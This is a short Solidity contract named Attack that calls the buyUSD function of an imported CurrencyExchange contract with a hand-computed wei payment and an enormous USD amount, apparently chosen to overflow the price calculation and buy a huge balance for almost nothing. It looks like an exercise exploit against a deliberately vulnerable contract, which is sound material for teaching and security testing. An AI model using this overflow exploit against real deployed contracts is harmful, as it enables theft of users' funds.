// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./CurrencyExchange.sol";


contract Attack {
    CurrencyExchange exh;

    constructor(address _addr) public {
        exh = CurrencyExchange(_addr);
    }

    function buyUSD() public payable {
        // Wei value: 415992086870360064
        // USD amount: 231584178474632390847141970017375815706539969331281128078916000
        exh.buyUSD{ value: 415992086870360064  }(231584178474632390847141970017375815706539969331281128078916000);  
    }

    function getBalance() public view returns (uint) {
    return address(this).balance;
    }
}